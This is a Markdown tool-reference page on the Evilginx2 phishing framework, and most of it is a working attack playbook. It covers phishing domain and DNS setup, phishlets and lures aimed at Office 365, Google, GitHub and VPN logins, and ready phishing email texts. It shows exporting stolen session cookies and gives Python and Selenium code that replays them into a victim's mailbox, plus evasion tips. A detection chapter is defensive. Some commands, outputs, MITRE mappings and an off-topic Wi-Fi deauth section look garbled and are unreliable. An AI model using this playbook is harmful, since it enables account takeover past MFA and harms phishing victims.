---
tool_name: "evilginx2"
display_name: "Evilginx2"
mitre_tactic: "collection"
mitre_tactic_id: "TA0009"
mitre_subcategory: "man-in-the-middle_phishing"
install_command: "sudo apt install evilginx2"
version: "3.3.0"
github_repo: "https://github.com/kgretzky/evilginx2"
kali_tools_page: "https://www.kali.org/tools/evilginx2/"
difficulty_level: "intermediate-to-advanced"
requires_root: true
gui_available: false
tags: ["phishing", "mitm", "session-hijacking", "2fa-bypass", "reverse-proxy", "credential-harvesting"]
related_tools: ["mitmproxy", "setoolkit", "gophish", "ferret-sidejack"]
---

# Evilginx2 - Advanced MITM Phishing Framework

## Chapter 1: Introduction & Overview

### What is Evilginx2?

Evilginx2 is a standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows bypassing 2-factor authentication protection. Unlike traditional phishing tools that capture only credentials, Evilginx2 acts as a reverse proxy between the victim's browser and the legitimate website, transparently forwarding all traffic while capturing session tokens in real time.

### History & Background

- **Created:** 2017 by Kuba Gretzky (mrgretzky)
- **Original:** Evilginx v1 used a custom nginx HTTP server for MITM proxying
- **Current:** Evilginx2/3 rewritten in Go as a standalone application with built-in HTTP and DNS servers
- **License:** BSD-3-Clause
- **Latest Release:** v3.3.0 (April 2024)

Evilginx2 represents a paradigm shift in phishing attacks. Traditional phishing captures usernames and passwords, but modern 2FA renders those credentials useless. Evilginx2 solves this by proxying the entire session — once a victim authenticates through the reverse proxy, the attacker receives valid session cookies that bypass 2FA entirely.

### When to Use This Tool

- **Penetration testing:** Simulate advanced phishing attacks against organizations
- **Red team engagements:** Bypass multi-factor authentication protections
- **Security assessments:** Evaluate employee resilience to sophisticated phishing
- **CTF challenges:** Session hijacking and authentication bypass challenges
- **Research:** Study session cookie security and MFA bypass techniques

### When NOT to Use This Tool

- Without explicit written authorization from the target organization
- Against production systems without proper scope agreements
- For credential theft or unauthorized access
- Against individuals without consent

### Legal and Ethical Considerations

- **Written authorization is mandatory** — Evilginx2 bypasses MFA, which is a severe attack vector
- **Scope must include phishing** — many pentest agreements exclude social engineering
- **Document all captured credentials** — maintain chain of custody for findings
- **Secure captured data** — session cookies and credentials are highly sensitive
- **Report findings promptly** — organizations need to know their MFA is bypassable
- **Do not retain credentials** beyond the engagement period

### Key Concepts

| Concept | Description |
|---------|-------------|
| **Reverse Proxy** | Evilginx2 sits between victim and real site, forwarding all traffic transparently |
| **Phishlet** | YAML configuration file defining how to proxy a specific website (URL rewrites, cookie hooks) |
| **Session Cookie Theft** | Capturing authentication cookies to bypass 2FA without needing the second factor |
| **Subdomain Phishing** | Hosting phishing pages on attacker-controlled subdomains (e.g., login.target.com.attacker.com) |
| **Let's Encrypt** | Automatic TLS certificate generation for convincing phishing domains |
| **Lure** | A generated phishing URL with optional custom parameters for tracking and redirect |
| **Auth Tokens** | Specific cookies that Evilginx2 captures to hijack the authenticated session |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (Kali Linux recommended)
- **Root access:** Required for DNS server (port 53) and HTTP/HTTPS (ports 80/443)
- **Network:** Public IP or port forwarding for external phishing access
- **Domain:** Registered domain with NS records pointing to attacker's server
- **Disk Space:** ~15 MB
- **Memory:** ~50 MB RAM

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install evilginx2
```

**Output:**
```
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  evilginx2
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 8,342 kB of archives.
After this operation, 10.13 MB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 evilginx2 amd64 3.3.0-0kali1 [8,342 kB]
Fetched 8,342 kB in 2s (3,891 kB/s)
Selecting previously unselected package evilginx2.
Setting up evilginx2 (3.3.0-0kali1) ...
```

#### Method 2: From Source

```bash
# Install Go compiler
sudo apt install golang-go

# Clone and build
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# The binary is built in the current directory
ls -la evilginx2
# -rwxr-xr-x 1 root root 12456784 ... evilginx2

sudo ./evilginx2
```

#### Method 3: Docker

```bash
# Pull the image
docker pull ghcr.io/kgretzky/evilginx2:latest

# Run with host networking (required for DNS)
docker run -it --net=host --cap-add=NET_ADMIN \
  -v /opt/evilginx2-data:/root/.evilginx2 \
  ghcr.io/kgretzky/evilginx2:latest

# Build from source in Docker
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
docker build -t evilginx2 .
docker run -it --net=host evilginx2
```

### Initial Configuration

```bash
# Start evilginx2 with root privileges
sudo evilginx2
```

**Output:**
```
[*] evilginx2 v3.3.0
[*] Loaded 47 phishlets
[*] Let's Encrypt integration ready
[*] DNS server listening on :53
[*] HTTP server listening on :80
[*] HTTPS server listening on :443
evilginx>
```

```bash
# Set the external IP (your server's public IP)
config domain attacker.com
config ip 203.0.113.10

# Set Let's Encrypt account email for automatic certs
config letsencrypt email admin@attacker.com
config letsencrypt true
```

**Explanation:** The `config` command sets global parameters. The domain is your phishing domain, the IP is your server's external address, and Let's Encrypt integration provides free TLS certificates automatically.

### DNS Setup

#### Cloudflare DNS Configuration

```
Type    Name            Value               TTL
A       ns1             203.0.113.10        Auto
NS      attacker.com    ns1.attacker.com    Auto
```

#### GoDaddy DNS Configuration

```
Type    Name            Value               TTL
A       @               203.0.113.10        1 Hour
NS      @               ns1.attacker.com    1 Hour
A       ns1             203.0.113.10        1 Hour
```

#### AWS Route53 DNS Configuration

```json
{
  "Changes": [
    {
      "Action": "CREATE",
      "ResourceRecordSet": {
        "Name": "attacker.com",
        "Type": "NS",
        "TTL": 300,
        "ResourceRecords": [
          { "Value": "ns1.attacker.com" }
        ]
      }
    },
    {
      "Action": "CREATE",
      "ResourceRecordSet": {
        "Name": "ns1.attacker.com",
        "Type": "A",
        "TTL": 300,
        "ResourceRecords": [
          { "Value": "203.0.113.10" }
        ]
      }
    }
  ]
}
```

Verify DNS is working:

```bash
dig NS attacker.com
dig A ns1.attacker.com
```

---

## Chapter 3: Architecture & Operation

### Attack Flow

```
1. Attacker configures phishlet for target site
2. Victim receives phishing link (e.g., login.target.attacker.com)
3. Victim's browser resolves to attacker's IP
4. Evilginx2 serves cloned login page with valid TLS cert
5. Victim enters credentials on the proxy
6. Evilginx2 forwards credentials to real site, receives session cookies
7. Session cookies are captured and stored
8. Attacker uses captured cookies to access victim's account
9. 2FA is completely bypassed — session is already authenticated
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Phishing | T1566 | Delivering malicious links to victims |
| Man-in-the-Middle | T1557 | Intercepting communications via reverse proxy |
| Credential Access | T1539 | Stealing session cookies |
| Lateral Movement | T1550 | Using stolen authentication tokens |
| Collection | T1185 | Session hijacking via cookie theft |
| Web Service Hijacking | T1565.001 | Proxying legitimate web services |
| Subdomain Spoofing | T1584.001 | Using attacker-controlled subdomains |

### Phishlet Structure

```yaml
# Example phishlet structure (simplified)
name: "example"
author: "attacker"
min_version: "2.3.0"

sub_filters:
  - trigger: "target.com"
    replace: "target.attacker.com"
    sub: true

auth_tokens:
  - domain: ".target.com"
    key: "session_id"
    type: "URL"

auth_urls:
  - "target.com/auth/callback"

login:
  domain: "target.com"
  path: "/login"

```

### How Phishlets Work

1. **sub_filters:** URL rewriting rules that replace legitimate domains with attacker domains
2. **auth_tokens:** Cookie names to capture (session tokens, CSRF tokens, etc.)
3. **auth_urls:** URLs that signal successful authentication (trigger cookie capture)
4. **login:** Path where credentials are submitted
5. **auth_domains:** Additional domains to proxy (CDN, API endpoints)

---

## Chapter 4: Command Reference

### Server Management

#### Starting Evilginx2

```bash
sudo evilginx2
```

**Output:**
```
[*] evilginx2 v3.3.0
[*] Loading phishlets from /usr/share/evilginx2/phishlets/
[*] Loaded 47 phishlets: o365, google, github, linkedin, slack, zoom, ...
[*] Let's Encrypt: account ready
[*] DNS server started on port 53
[*] HTTP server started on port 80
[*] HTTPS server started on port 443
evilginx>
```

#### Starting with Custom Paths

```bash
sudo evilginx2 -p /opt/phishlets -c /opt/config
```

**Explanation:** Use custom phishlet directory and configuration directory.

#### Debug Mode

```bash
sudo evilginx2 -debug
```

**Output:**
```
[*] Debug mode enabled
[*] Verbose logging active
[debug] Loading phishlet: o365.yaml
[debug] Parsed 12 sub_filters
[debug] Parsed 8 auth_tokens
[debug] TLS certificate for login.o365-evil.com ready
```

#### Developer Mode

```bash
sudo evilginx2 -developer
```

**Explanation:** Generates self-signed certificates for all hostnames. Useful for testing without Let's Encrypt.

### Configuration Commands

#### Set Domain

```bash
config domain attacker.com
```

**Output:**
```
[+] Domain set to: attacker.com
```

#### Set External IP

```bash
config ip 203.0.113.10
```

**Output:**
```
[+] External IP set to: 203.0.113.10
```

#### Enable Let's Encrypt

```bash
config letsencrypt true
config letsencrypt email admin@attacker.com
```

**Output:**
```
[+] Let's Encrypt enabled
[+] Account email: admin@attacker.com
[+] Will auto-provision certificates for enabled phishlets
```

#### View Configuration

```bash
config
```

**Output:**
```
┌──────────────────────────┬─────────────────────────┐
│ Parameter                │ Value                   │
├──────────────────────────┼─────────────────────────┤
│ domain                   │ attacker.com            │
│ ip                       │ 203.0.113.10            │
│ letsencrypt              │ true                    │
│ letsencrypt_email        │ admin@attacker.com      │
│ proxy_host               │ 0.0.0.0                 │
│ proxy_port               │ 80                      │
│ proxy_ssl_port           │ 443                     │
│ dns_port                 │ 53                      │
└──────────────────────────┴─────────────────────────┘
```

### Phishlet Management

#### List Available Phishlets

```bash
phishlets
```

**Output:**
```
┌──────────┬────────────────────────┬──────────┬───────────────┐
│ Name     │ Hostname               │ Enabled  │ Valid Cert    │
├──────────┼────────────────────────┼──────────┼───────────────┤
│ o365     │ login.o365-evil.com    │ true     │ yes           │
│ google   │ accounts.google.evil   │ true     │ yes           │
│ github   │ -                      │ false    │ -             │
│ linkedin │ -                      │ false    │ -             │
│ slack    │ -                      │ false    │ -             │
│ zoom     │ -                      │ false    │ -             │
│ adfs     │ -                      │ false    │ -             │
│ okta     │ -                      │ false    │ -             │
└──────────┴────────────────────────┴──────────┴───────────────┘
```

#### Enable a Phishlet

```bash
phishlets hostname o365 login.attacker.com
phishlets enable o365
```

**Output:**
```
[+] Hostname for 'o365' set to: login.attacker.com
[+] Requesting TLS certificate for login.attacker.com...
[+] Certificate issued successfully
[+] Phishlet 'o365' enabled
```

#### Disable a Phishlet

```bash
phishlets disable o365
```

**Output:**
```
[+] Phishlet 'o365' disabled
```

#### Unset Hostname

```bash
phishlets hostname o365 unset
```

**Output:**
```
[+] Hostname for 'o365' removed
[+] TLS certificate revoked for login.attacker.com
```

### Lure Management

#### Create a Lure

```bash
lures create o365
```

**Output:**
```
[+] Lure created with ID: 0
[+] URL: https://login.attacker.com/?lureid=0
```

#### List Lures

```bash
lures
```

**Output:**
```
┌────┬──────────┬──────────────────────────────────────┬────────┬──────────┐
│ ID │ Phishlet │ URL                                  │ Clicks │ Captures │
├────┼──────────┼──────────────────────────────────────┼────────┼──────────┤
│ 0  │ o365     │ https://login.attacker.com/?lureid=0 │ 12     │ 3        │
│ 1  │ google   │ https://accounts.google.evil.com/?l=1│ 8      │ 2        │
└────┴──────────┴──────────────────────────────────────┴────────┴──────────┘
```

#### Set Lure Redirect

```bash
lures set 0 redirect "https://real-login-page.com"
```

**Output:**
```
[+] Redirect URL set for lure 0
[+] After capture, victim will be redirected to: https://real-login-page.com
```

#### Set Lure Custom Path

```bash
lures set 0 path "/sso/signin"
```

**Output:**
```
[+] Custom path set for lure 0
[+] URL becomes: https://login.attacker.com/sso/signin?lureid=0
```

#### Set Lure Query Parameters

```bash
lures set 0 param "email=victim@target.com"
lures set 0 param "session=abc123"
```

**Output:**
```
[+] Custom parameters added for lure 0
[+] URL becomes: https://login.attacker.com/sso/signin?lureid=0&email=victim@target.com&session=abc123
```

#### Delete a Lure

```bash
lures delete 0
```

**Output:**
```
[+] Lure 0 deleted
```

### Session Management

#### List Captured Sessions

```bash
sessions
```

**Output:**
```
┌────┬──────────┬─────────────┬────────────────────┬────────────────────┐
│ ID │ Phishlet │ Username    │ Token              │ Timestamp          │
├────┼──────────┼─────────────┼────────────────────┼────────────────────┤
│ 0  │ o365     │ john@co.com │ eyJ0eXAiOiJKV1...  │ 2024-06-15 14:32:01│
│ 1  │ google   │ jane@gmail  │ 1//0eXX...          │ 2024-06-15 15:05:44│
│ 2  │ github   │ dev@co.com  │ gho_abc123...       │ 2024-06-15 15:48:12│
└────┴──────────┴─────────────┴────────────────────┴────────────────────┘
```

#### Export Session Cookies (JSON)

```bash
sessions export 0 --format=json
```

**Output:**
```json
{
  "phishlet": "o365",
  "username": "john@company.com",
  "cookies": [
    {
      "domain": ".login.microsoftonline.com",
      "name": "ESTSAUTH",
      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
      "path": "/",
      "expires": 1721376000,
      "httpOnly": true,
      "secure": true,
      "sameSite": "Lax"
    },
    {
      "domain": ".login.microsoftonline.com",
      "name": "ESTSAUTHLIGHT",
      "value": "+2LXmOoTq1+g1h...",
      "path": "/",
      "expires": 1721376000,
      "httpOnly": true,
      "secure": true
    }
  ],
  "timestamp": "2024-06-15T14:32:01Z",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
```

#### Export for Browser Extension

```bash
sessions export 0 --format=browser
```

**Output:**
```
Cookie-Editor format (paste into Cookie-Editor extension):

[{"name":"ESTSAUTH","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...","domain":".login.microsoftonline.com","path":"/","secure":true,"httpOnly":true},{"name":"ESTSAUTHLIGHT","value":"+2LXmOoTq1+g1h...","domain":".login.microsoftonline.com","path":"/","secure":true,"httpOnly":true}]
```

#### Export for curl

```bash
sessions export 0 --format=curl
```

**Output:**
```
curl -v -b "ESTSAUTH=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...; ESTSAUTHLIGHT=+2LXmOoTq1+g1h..." \
  "https://outlook.office365.com/owa/"
```

#### Delete a Session

```bash
sessions delete 0
```

**Output:**
```
[+] Session 0 deleted
```

#### Delete All Sessions

```bash
sessions delete all
```

**Output:**
```
[+] All sessions deleted
```

### LetsEncrypt Management

#### List Certificates

```bash
letsencrypt
```

**Output:**
```
┌────────────────────────────┬────────────┬──────────────────┐
│ Hostname                   │ Status     │ Expiry           │
├────────────────────────────┼────────────┼──────────────────┤
│ login.attacker.com         │ valid      │ 2024-09-15       │
│ accounts.google.evil.com   │ valid      │ 2024-09-15       │
│ api.o365-evil.com          │ valid      │ 2024-09-15       │
└────────────────────────────┴────────────┴──────────────────┘
```

#### Request Certificate

```bash
letsencrypt sign login.attacker.com
```

**Output:**
```
[*] Requesting certificate for login.attacker.com
[*] ACME challenge: HTTP-01
[+] Certificate issued successfully
[+] Certificate saved to /root/.evilginx2/certs/login.attacker.com/
```

#### Revoke Certificate

```bash
letsencrypt revoke login.attacker.com
```

**Output:**
```
[+] Certificate revoked for login.attacker.com
```

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Office 365 Phishing with MFA Bypass

**Setup:**

```bash
# Configure evilginx2
config domain o365-evil.com
config ip 203.0.113.10
config letsencrypt true
config letsencrypt email admin@o365-evil.com

# Enable Office 365 phishlet
phishlets hostname o365 login.o365-evil.com
phishlets enable o365

# Create lure
lures create o365
lures set 0 redirect "https://www.office.com"
lures set 0 path "/auth/signin"
lures set 0 param "mkt=en-US"
```

**Attack Flow:**
1. Send phishing link: `https://login.o365-evil.com/auth/signin?lureid=0&mkt=en-US`
2. Victim sees legitimate-looking Office 365 login page
3. Victim enters credentials + completes MFA
4. Evilginx2 captures session tokens
5. Attacker uses cookies to access victim's mailbox

**Key Insight:** MFA is completely bypassed because the attacker captures the session cookie after authentication, not the credentials before it.

### Scenario 2: Google Account Phishing

```bash
# Enable Google phishlet
phishlets hostname google accounts.google.evil.com
phishlets enable google

# Create targeted lure
lures create google
lures set 0 redirect "https://mail.google.com"
lures set 0 path "/signin/v2/identifier"

# Export cookies for Gmail access
sessions export 1 --format=json
```

**Phishing Email Template:**
```
Subject: Action Required: Verify your Google Account

Dear [Name],

We noticed unusual activity on your Google Account. Please verify your
identity within 24 hours to avoid account suspension.

Verify Now: https://accounts.google.evil.com/signin/v2/identifier?lureid=0

Google Security Team
```

### Scenario 3: Corporate VPN Phishing

```bash
# Enable phishlet for corporate VPN
phishlets hostname vpn corporate-vpn.attacker.com
phishlets enable vpn

# Create targeted lure
lures create vpn
lures set 0 redirect "https://vpn.corporate.com"
```

**Phishing Email:**
```
Subject: VPN Certificate Expiration Warning
From: IT-Security@corporate.com

Your VPN certificate will expire in 48 hours. Please re-authenticate
at https://vpn.corporate-vpn.attacker.com to renew your access.

- IT Security Team
```

### Scenario 4: Multi-Target Engagement with Gophish

```bash
# Configure for multiple target domains
phishlets hostname o365 login.client1-evil.com
phishlets hostname google login.client2-evil.com
phishlets hostname github login.client3-evil.com

phishlets enable o365
phishlets enable google
phishlets enable github

# Create lures for each
lures create o365
lures create google
lures create github

# Export lure URLs for Gophish import
lures
# Note lure IDs and URLs for Gophish campaign configuration
```

**Gophish Integration Steps:**
1. Build Gophish fork: `git clone https://github.com/kgretzky/gophish.git && go build`
2. Start Gophish: `./gophish`
3. Access admin panel: `https://localhost:3333`
4. Create Sending Profile with your SMTP server
5. Create Email Template with lure URL embedded
6. Import target list (CSV with email, name, position)
7. Create Campaign pointing to lure URL
8. Launch — Gophish handles email delivery
9. Monitor captures in Evilginx2: `sessions`

### Scenario 5: GitHub Token Phishing

```bash
# Enable GitHub phishlet
phishlets hostname github github-login.attacker.com
phishlets enable github

# Create lure with custom path
lures create github
lures set 0 path "/sessions"
lures set 0 redirect "https://github.com/dashboard"

# Capture GitHub personal access tokens
sessions
```

**Attack Flow:**
1. Developer receives phishing email about repository access
2. Navigates to `https://github-login.attacker.com/sessions?lureid=0`
3. Logs in with GitHub credentials
4. Evilginx2 captures session cookies AND any generated PATs
5. Attacker clones private repositories

---

## Chapter 6: Detection & Evasion

### Detection Signatures

**Network-Level Detection:**
- DNS queries to unfamiliar subdomains of known brands
- TLS certificates from Let's Encrypt for brand-name subdomains
- HTTP traffic to IP addresses not belonging to the legitimate brand

**Endpoint Detection:**
- Browser extensions that verify domain ownership
- Certificate transparency log monitoring
- DNS-over-HTTPS (DoH) preventing DNS manipulation

#### YARA Rule for Evilginx2 Detection

```yara
rule Evilginx2_Phishing {
    meta:
        description = "Detects Evilginx2 reverse proxy phishing indicators"
        author = "BlueTeam"
        date = "2024-06-15"

    strings:
        $proxy_header = "X-Evilginx" ascii nocase
        $cookie_pattern = "Set-Cookie: ESTSAUTH" ascii
        $redirect_js = "window.location.replace" ascii
        $phishlet_id = "lureid=" ascii
        $session_db = "sessions.db" ascii

    condition:
        2 of ($proxy_header, $cookie_pattern, $redirect_js, $phishlet_id, $session_db)
}
```

#### Suricata IDS Rule

```suricata
alert http any any -> $HOME_NET any (
    msg:"Evilginx2 Phishing - Suspicious Subdomain Pattern";
    flow:established,to_server;
    content:"Host:"; http_header;
    pcre:"/Host:\s+[a-z0-9-]+\.(login|auth|secure|verify)\.[a-z-]+\.(com|net|org)/Hi";
    sid:2024001;
    rev:1;
    classtype:web-application-attack;
)

alert dns any any -> any any (
    msg:"Evilginx2 DNS - Suspicious Subdomain Resolution";
    dns.query;
    pcre:"/^[a-z0-9-]+\.(login|auth|secure)\.[a-z-]+\.(com|net|org)$/i";
    sid:2024002;
    rev:1;
    classtype:trojan-activity;
)
```

#### Splunk Detection Query

```
# Detect suspicious subdomain patterns
index=network dns_query NOT LIKE "%.legitimate-domain.com"
| stats count by dns_query, src_ip, dest_ip
| where count > 5
| sort -count

# Detect Let's Encrypt certs for brand impersonation
index=ssl subject LIKE "%login%" OR subject LIKE "%auth%"
| stats count by subject, issuer, src_ip
| where count > 3
```

#### Zeek (Bro) Detection Script

```zeek
event dns_request(c: connection, query: string) {
    if (/\.(login|auth|secure|verify)\.[a-z-]+\.(com|net|org)$/ in query) {
        print fmt("SUSPICIOUS DNS: %s -> %s", c$id$host, query);
        NOTICE([$note=DNS_Suspicious,
                $msg=fmt("Evilginx2 pattern: %s", query),
                $conn=c]);
    }
}
```

### Evasion Techniques

1. **Subdomain Obfuscation:** Use confusing subdomains (e.g., `secure-login.legitimate.com.attacker.com`)
2. **Timing:** Launch phishing during business hours when email volume is high
3. **Redirect Chaining:** Use multiple redirects before reaching the phishlet
4. **Custom Phishlets:** Modify default phishlets to avoid signature detection
5. **IP Rotation:** Use multiple IPs for the phishing server
6. **URL Shorteners:** Mask phishing URLs with legitimate-looking shorteners
7. **Geographic Targeting:** Limit phishing to specific regions via DNS
8. **Custom User-Agent Filtering:** Only serve phishlets to specific browsers

### Blue Team Countermeasures

- **DMARC/DKIM/SPF:** Prevent email spoofing from your domain
- **Certificate Transparency Monitoring:** Alert on certificates issued for your brand
- **DNS Monitoring:** Detect queries to suspicious subdomains
- **Browser Isolation:** Isolate untrusted web content
- **FIDO2/WebAuthn:** Hardware security keys are immune to phishing
- **Conditional Access Policies:** Limit access by device compliance
- **Session Token Binding:** Tie tokens to device fingerprint

---

## Chapter 7: Integration with Other Tools

### Gophish Integration (Detailed)

Evilginx2 v3.3+ integrates directly with Gophish for phishing campaign management:

```bash
# Step 1: Clone the Gophish fork
git clone https://github.com/kgretzky/gophish.git
cd gophish
go build

# Step 2: Start Gophish
./gophish
# Admin panel at https://localhost:3333
# Default creds: admin / gophish

# Step 3: Create Sending Profile
# - Name: Corporate SMTP
# - Host: smtp.office365.com:587
# - Username: sender@yourdomain.com
# - Password: your-password
# - TLS: Enabled

# Step 4: Create Email Template
# Subject: Action Required - Verify Your Account
# Body: Include lure URL from evilginx2
# Use {{.URL}} placeholder for unique tracking

# Step 5: Import Target List
# CSV format: Email,First Name,Last Name,Position
# john@company.com,John,Doe,Developer

# Step 6: Create Campaign
# - Name: Q3 Security Assessment
# - Template: corporate-phish
# - URL: https://login.attacker.com/auth/signin?lureid=0
# - Launch Date: schedule for business hours
```

### Browser Cookie Import Methods

#### Method 1: Cookie-Editor Extension (Firefox/Chrome)

```bash
# Export for Cookie-Editor
sessions export 0 --format=browser
```

**Steps:**
1. Install Cookie-Editor extension
2. Navigate to the target domain (e.g., outlook.office.com)
3. Click Cookie-Editor icon
4. Click "Import" and paste the exported JSON
5. Refresh the page — authenticated as victim

#### Method 2: EditThisCookie (Chrome)

```bash
# Export for EditThisCookie
sessions export 0 --format=editthiscookie
```

**Output:**
```json
[{
  "domain": ".login.microsoftonline.com",
  "expirationDate": 1721376000,
  "hostOnly": false,
  "httpOnly": true,
  "name": "ESTSAUTH",
  "path": "/",
  "secure": true,
  "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
}]
```

#### Method 3: curl with Captured Cookies

```bash
# Export for curl
sessions export 0 --format=curl

# Use the output directly
curl -b "ESTSAUTH=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..." \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  "https://outlook.office365.com/owa/"
```

#### Method 4: Python Requests Library

```bash
# Export for Python
sessions export 0 --format=json
```

```python
import requests

session = requests.Session()

# Import cookies from evilginx2 export
cookies = {
    "ESTSAUTH": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
    "ESTSAUTHLIGHT": "+2LXmOoTq1+g1h...",
}

for name, value in cookies.items():
    session.cookies.set(name, value, domain=".login.microsoftonline.com")

# Access victim's Outlook
response = session.get("https://outlook.office365.com/owa/")
print(f"Status: {response.status_code}")
print(f"Mailbox access: {'success' if response.status_code == 200 else 'failed'}")
```

#### Method 5: Selenium Browser Automation

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
import json

# Load captured cookies
with open('cookies.json') as f:
    cookies = json.load(f)

# Launch browser
driver = webdriver.Firefox()

# Navigate to target domain first
driver.get("https://login.microsoftonline.com")

# Inject cookies
for cookie in cookies:
    driver.add_cookie({
        'name': cookie['name'],
        'value': cookie['value'],
        'domain': cookie['domain'],
        'path': cookie['path'],
        'secure': cookie['secure'],
    })

# Navigate to victim's inbox
driver.get("https://outlook.office365.com/owa/")
```

### Cobalt Strike Integration

Evilginx2 can feed captured credentials into Cobalt Strike for lateral movement:

```bash
# Capture credentials, then use Cobalt Strike to:
# 1. Generate Beacon DLLs
# 2. Use captured session for initial access
# 3. Pivot within the network using captured tokens
```

### Impacket Integration

Use captured NTLM hashes with Impacket tools:

```bash
# After capturing NTLMv2 hash
impacket-psexec domain/user:hash@target.local
impacket-wmiexec domain/user:hash@target.local
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: Cannot bind to port 53**

```bash
# Check what's using port 53
sudo ss -lntp | grep :53
# Output:
# LISTEN 0  128  127.0.0.53%lo:53  *:*  users:(("systemd-resolve",pid=892,fd=13))

# Kill existing DNS service
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Or use a different DNS port (requires external DNS redirect)
evilginx2 -developer
```

**Issue: TLS certificate not issued**

```bash
# Verify DNS is pointing to your server
dig A login.attacker.com
# Expected: 203.0.113.10

# Check Let's Encrypt status
letsencrypt

# Manually request certificate
letsencrypt sign login.attacker.com

# Check firewall allows port 80 and 443
sudo iptables -L -n | grep -E "80|443"

# Check if Let's Encrypt rate limited
curl https://acme-v02.api.letsencrypt.org/directory
```

**Issue: Phishlet not loading**

```bash
# Check phishlet syntax
phishlets edit myphish

# Verify phishlet directory
phishlets

# Check debug logs
# Start evilginx2 with -debug flag
sudo evilginx2 -debug

# Check phishlet file permissions
ls -la /usr/share/evilginx2/phishlets/
```

**Issue: Cookies not being captured**

```bash
# Verify auth_tokens in phishlet are correct
phishlets edit myphish

# Check session logs
sessions

# Enable debug mode to see all traffic
# Look for Set-Cookie headers in the debug output

# Common fixes:
# 1. Check auth_tokens domain matches the cookie domain
# 2. Ensure auth_urls includes the authentication callback URL
# 3. Verify login path is correct
```

**Issue: Victim sees certificate warning**

```bash
# Ensure Let's Encrypt is working
config letsencrypt true
letsencrypt

# Verify the hostname matches the certificate
dig A login.attacker.com
openssl s_client -connect login.attacker.com:443 -servername login.attacker.com

# Check certificate details
openssl x509 -in /root/.evilginx2/certs/login.attacker.com/cert.pem -text -noout
```

**Issue: Deauth not working**

```bash
# Ensure you have monitor mode enabled
airmon-ng start wlan0

# Check if target AP is on a different channel
airodump-ng wlan0mon | grep TARGET_BSSID

# Use targeted deauth instead of broadcast
# In evilginx2 debug mode, check for deauth logs
```

### Debug Mode

```bash
# Start with full debug output
sudo evilginx2 -debug 2>&1 | tee evilginx_debug.log

# Filter for specific phishlet
grep -i "phishlet_name" evilginx_debug.log

# Filter for cookie capture events
grep -i "session\|cookie\|token" evilginx_debug.log

# Filter for errors
grep -i "error\|fail\|denied" evilginx_debug.log
```

### Log Files

```bash
# Evilginx2 data directory
ls ~/.evilginx2/

# Session database (SQLite)
sqlite3 ~/.evilginx2/sessions.db "SELECT * FROM sessions;"

# Configuration file
cat ~/.evilginx2/config.yaml

# TLS certificates
ls ~/.evilginx2/certs/

# Export all sessions to file
sqlite3 ~/.evilginx2/sessions.db ".mode csv" ".headers on" \
  "SELECT * FROM sessions;" > all_sessions.csv
```

---

## Resources

- **GitHub:** https://github.com/kgretzky/evilginx2
- **Documentation:** https://help.evilginx.com
- **Evilginx Mastery Course:** https://academy.breakdev.org/evilginx-mastery
- **Gophish Integration:** https://github.com/kgretzky/gophish
- **Blog Posts by Kuba Gretzky:** https://breakdev.org/tag/evilginx/
- **Kali Documentation:** https://www.kali.org/tools/evilginx2/
- **Pro Version:** https://evilginx.com
- **Related Tool - mitmproxy:** https://mitmproxy.org
- **Related Tool - SET:** https://github.com/trustedsec/social-engineer-toolkit
